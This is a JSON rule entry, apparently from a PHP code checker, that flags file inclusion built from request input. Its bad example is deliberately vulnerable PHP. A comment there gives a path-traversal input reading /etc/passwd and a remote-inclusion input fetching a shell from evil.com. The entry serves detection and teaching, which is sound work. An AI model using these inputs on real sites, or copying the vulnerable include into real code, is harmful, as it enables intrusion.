{
  "rule_code": "E0122",
  "title": "E0122: File inclusion with user input",
  "plain_english": "",
  "why_matters": "",
  "bad_example": "$page = $_GET['page'] ?? '';\ninclude \"/var/www/pages/$page.php\";\n// ?page=../../../etc/passwd or ?page=http://evil.com/shell",
  "good_example": "$page = $_GET['page'] ?? '';\n$allowed = ['home', 'about', 'contact'];\nif (!in_array($page, $allowed, true)) {\n    $page = 'home';\n}\ninclude \"/var/www/pages/$page.php\";",
  "severity": "info",
  "category": "general",
  "what_it_checks": [
    "`include`, `require`, `include_once`, `require_once` with paths containing tainted input",
    "`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE` values used directly in include paths"
  ]
}